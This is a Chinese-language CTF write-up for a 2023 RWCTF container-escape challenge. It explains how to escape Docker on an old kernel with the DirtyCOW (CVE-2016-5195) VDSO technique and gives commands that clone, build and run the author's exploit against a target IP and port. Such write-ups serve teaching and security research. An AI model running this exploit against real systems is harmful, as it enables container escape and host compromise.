## About

这是2023年第五届RWCTF体验赛的容器逃逸的其中一个题目, 题目作者是 [zh-explorer][1]

## Description of the challenge

## Weriteup
首先查看内核版本。可以发现是一个比较旧的内核版本

再结合题目描述和名字，可以知道这题应该需要使用CVE-2016-5195也就是著名的DirtyCOW漏洞来进行容器逃逸。

想要使用DirtyCOW进行容器逃逸。需要使用DirtyCOW-VDSO的利用方式，也就是通过DirtyCOW覆盖VDSO数据来实现对容器的逃逸。

但是现有的最著名的vdso逃逸利用https://github.com/scumjr/dirtycow-vdso存在以下两个问题：

1. 该利用使用的ptrace方式来实现对VDSO内存的修改触发COW。但是新版本docker默认禁止ptrace。
2. 该利用对vdso的patch选择的位置在ubuntu的内核里触发不了。需要换个一patch点。
    本着不能只有自己被坑的原则，出了这题。
    需要将原来的ptrace利用方式换回/proc/self/mem利用并且更换触发点。或者不想改也可以重写一遍DirtyCOW利用即可。利用参考https://github.com/zh-explorer/dirtycow.git。利用流程如下：

```bash
pip install -i https://pypi.tuna.tsinghua.edu.cn/simple pyelftools
git clone https://github.com/zh-explorer/dirtycow.git
cd  dirtycow
mkdir build
cd build
cmake ..
make
./dirtycow {IP} 31337
```



![img](https://alidocs.oss-cn-zhangjiakou.aliyuncs.com/res/w5VLqXgzQVKxnX19/img/58f35648-e589-4117-82ba-258a554deea4.png)



![img](https://alidocs.oss-cn-zhangjiakou.aliyuncs.com/res/w5VLqXgzQVKxnX19/img/2feeffe4-f727-4c62-b499-f03f97372396.png)

## Deploy

题目部署脚本相关可以参考 [deploy][2] 文件夹


## Reference Link

[1]: https://github.com/zh-explorer
[2]: ./deploy	"题目部署脚本"
